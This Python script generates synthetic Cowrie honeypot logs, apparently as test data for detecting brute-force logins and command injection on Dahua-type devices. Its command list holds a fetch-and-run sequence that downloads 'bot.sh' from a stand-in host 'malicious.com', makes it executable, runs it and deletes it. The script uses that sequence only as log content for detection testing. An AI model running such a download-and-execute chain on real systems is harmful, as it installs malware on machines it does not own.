import json
import sys
import copy

source_file = 'dahua_logs (1).json'
output_file = 'dahua_sublogs.json'

with open(source_file, 'r') as f:
    lines = f.readlines()

records = []
for line in lines:
    line = line.strip()
    if not line: continue
    records.append(json.loads(line))

ip1 = '192.168.1.100'  # Brute force IP
ip2 = '10.0.0.50'      # Command injection IP

new_records = []
# Create 25 brute force logs for IP1
for i in range(24):
    rec = copy.deepcopy(records[1]) # use a template
    rec['eventid'] = 'cowrie.login.failed'
    rec['src_ip'] = ip1
    rec['username'] = 'root'
    rec['password'] = f'pass{i}'
    rec['message'] = f'login attempt [root/pass{i}] failed'
    new_records.append(rec)

# 1 success
rec = copy.deepcopy(records[1])
rec['eventid'] = 'cowrie.login.success'
rec['src_ip'] = ip1
rec['username'] = 'root'
rec['password'] = 'admin123'
rec['message'] = 'login attempt [root/admin123] succeeded'
new_records.append(rec)

# Create 25 command logs for IP2
cmds = ['uname -a', 'id', 'wget http://malicious.com/bot.sh', 'chmod +x bot.sh', './bot.sh', 'rm bot.sh']
for i in range(25):
    rec = copy.deepcopy(records[8]) # use a command template
    rec['eventid'] = 'cowrie.command.input'
    rec['src_ip'] = ip2
    cmd = cmds[i % len(cmds)]
    rec['input'] = cmd
    rec['message'] = f'CMD: {cmd}'
    new_records.append(rec)

with open(output_file, 'w') as f:
    for rec in new_records:
        f.write(json.dumps(rec) + '\n')

print(f'Successfully created {output_file} with {len(new_records)} logs!')
